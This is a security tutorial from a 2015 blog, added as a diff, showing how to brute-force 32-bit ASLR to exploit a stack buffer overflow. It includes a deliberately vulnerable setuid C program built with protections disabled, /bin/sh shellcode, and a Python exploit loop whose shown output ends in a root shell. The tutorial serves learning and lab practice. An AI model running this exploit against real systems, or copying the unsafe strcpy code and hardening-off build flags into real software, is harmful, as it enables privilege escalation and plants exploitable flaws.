@@ -1,0 +1,196 @@
+https://taishi8117.github.io/2015/11/11/stack-bof-2/
+Exploiting Simple Buffer Overflow (2) | Shellcode + ASLR Bruteforcing
+
+Hi! For my second article on exploiting simple buffer overflow, I want to talk about bruteforcing against ASLR (Address Space Layout Randomization). For those who are not so familiar with ASLR, it is a common countermeasure technique against traditional stack-based stack buffer overflow exploit--- it randomizes the memory address layout (e.g. stack) every time a program is run so that an attacker cannot know the exact location of shellcode/variable/etc beforehand. It is enabled by default for most recent operation systems, and it is fairly effective for 64-bit systems (the range of randomization of address layout is 28-bit). However, for 32-bit systems, the range of randomization of address layout is so much smaller that bruteforcing is feasible.
+
+So, in this article, I will demonstrate a bruteforce against ASLR in 32-bit system, so that an arbitrary shellcode can be run. Note that other countermeasure techniques (e.g. DEP, Canary) are not used for the sake of simplicity in this experiment. (I promise that I will post about attacks against these techniques in the future!) Also, source code used in this article can be downloaded from here.
+
+I will use Ubuntu 14.04 32-bit for this experiment.
+
+canopus@canopus:~/bof_lab/bof|master
+⇒  uname -a
+Linux canopus 3.16.0-50-generic #67~14.04.1-Ubuntu SMP Fri Oct 2 22:08:53 UTC 2015 i686 i686 i686 GNU/Linux
+canopus@canopus:~/bof_lab/bof|master
+⇒  lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 14.04.3 LTS
+Release:    14.04
+Codename:   trusty
+canopus@canopus:~/bof_lab/bof|master
+⇒  gcc --version
+gcc (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4
+Copyright (C) 2013 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+And here is a simple vulnerable program that I will use. As you can see, vuln() function has a buffer overflow vulnerability when strcpy is called.
+
+#include    <stdio.h>
+#include    <stdlib.h>
+#include    <assert.h>
+#include    <string.h>
+
+
+void vuln (const char* arg){
+    char buffer[100];
+    strcpy(buffer, arg);
+    printf("Hello %s\n", buffer);
+    printf("[+] buffer @ %p\n", buffer);
+}
+
+int main (int argc, char **argv){
+
+    if (argc != 2) {
+        printf("Usage: %s <buffer>\n", argv[0]);
+        exit(1);
+    }
+    vuln(argv[1]);
+        return 0;
+}
+And for Makefile, make sure that -fno-stack-protector and -z execstack are included in the flags.
+
+CC=gcc
+CFLAGS=-std=c99 -Wall -fno-stack-protector -z execstack
+
+all: bof
+
+bof: bof.o
+    $(CC) $(CFLAGS) -o $@ $^
+    sudo chown 0:0 $@
+    sudo chmod u+s $@
+
+bof.o: bof.c
+
+clean:
+    rm bof.o bof
+After it was compiled, make sure that ASLR is turned on. Note that echo 1 | sudo tee /proc/sys/kernel/randomize_va_space can turn on ASLR. (echo 0 to disable, echo 2 to enable full ASLR)
+
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+1
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  gdb -q ./bof
+Reading symbols from ./bof...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+Let's examine how the program behaves when its buffer is overflowed.
+
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  gdb -q ./bof
+Reading symbols from ./bof...(no debugging symbols found)...done.
+gdb-peda$ pattern_create 120
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
+gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
+Starting program: /home/canopus/bof_lab/bof/bof 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
+Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
+[+] buffer @ 0xbf991ccc
+
+Program received signal SIGSEGV, Segmentation fault.
+(...)
+
+gdb-peda$ pattern_search
+Registers contain pattern buffer:
+EIP+0 found at offset: 112      (<== offset: 112)
+EBP+0 found at offset: 108
+(...)
+
+gdb-peda$ p $eip
+$1 = (void (*)()) 0x41384141
+As you can see, 4 bytes starting from 112th character in the input string will overwrite EIP.
+
+Let's also check how ASLR affects the address of buffer.
+
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  ./bof AAAA
+Hello AAAA
+[+] buffer @ 0xbfe9a8fc
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  ./bof AAAA
+Hello AAAA
+[+] buffer @ 0xbfb43e4c
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  ./bof AAAA
+Hello AAAA
+[+] buffer @ 0xbf8c941c
+As you can see, the location of buffer is randomized every time the program is run, and it is impossible to guess its exact location for the next execution. However, if you examine the location of buffer enough times, you will realize that its location is within the range of 0xbf*****c. In this case, there are 1048576 possible locations where buffer is loaded. So, you can use a strategy --- randomly pick a memory address within the valid range, and run the program repeatedly until buffer happens to be located at that location and that's when the shellcode is executed.
+
+Let's also write a shellcode that executes '/bin/sh' so you can get a shell. I will not explain the details of how to write shellcode, but there are lots of resources on the web that you can find very useful.
+
+global _start
+
+section .text
+
+_start:
+    xor eax, eax
+    push eax
+
+    push 0x68732f2f     ;//sh
+    push 0x6e69622f     ;/bin
+    mov ebx, esp        ;moving the pointer to "/bin//sh" to ebx
+
+    push eax            ;push 0 (=eax)
+    mov edx, esp        ;moving 0 to edx
+
+    push ebx
+    mov ecx, esp        ;moving the pointer to "/bin//sh" to ecx
+
+    mov al, 11
+    int 0x80            ;execv syscall
+Now, we have everything that's needed to exploit this program. Below is the exploit code written in Python. Note that in order to increase the chance of shellcode being executed, I added 4096 bytes of NOP instruction right before the inserted shellcode. In this way, if the returned address (=addr_buffer+bufsize+offset+4) happens to be within this NOP range, the shellcode is properly executed as well (the longer the NOP sled, the less number of attempts necessary for a successful attack).
+
+#!/usr/bin/python
+
+import struct, sys, time
+from subprocess import PIPE, Popen
+
+# exec /bin/sh
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+bufsize = 100
+offset = 12     #incl. saved ebp
+nopsize = 4096
+
+def prep_buffer(addr_buffer):
+    buf = "A" * (bufsize+offset)
+    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
+    buf += "\x90" * nopsize
+    buf += shellcode
+    return buf
+
+def brute_aslr(buf):
+    p = Popen(['./bof', buf]).wait()
+
+if __name__ == '__main__':
+    addr_buffer = 0xbf92b39c    # randomly decided
+    buf = prep_buffer(addr_buffer)
+    i = 0
+    while True:
+        print i
+        brute_aslr(buf)
+        i += 1
+And here it is! The shell was given after 998 attempts in my case. You can experiment in your environment too. Normally for this program with 4096 bytes of NOP sled, around 1000 times of attempts are necessary for a successful attack, which is significantly less than 1048576 (the number of possible address location of buffer)!
+
+canopus@canopus:~/bof_lab/bof|master⚡
+⇒  python exploit.py
+(...)
+(...)
+
+[+] buffer @ 0xbfc2bc0c
+996
+(... snippet)
+
+[+] buffer @ 0xbfb9930c
+997
+(... snippet)
+
+[+] buffer @ 0xbf92721c
+998
+(... snippet)
+
+[+] buffer @ 0xbf92a26c
+# whoami
+root
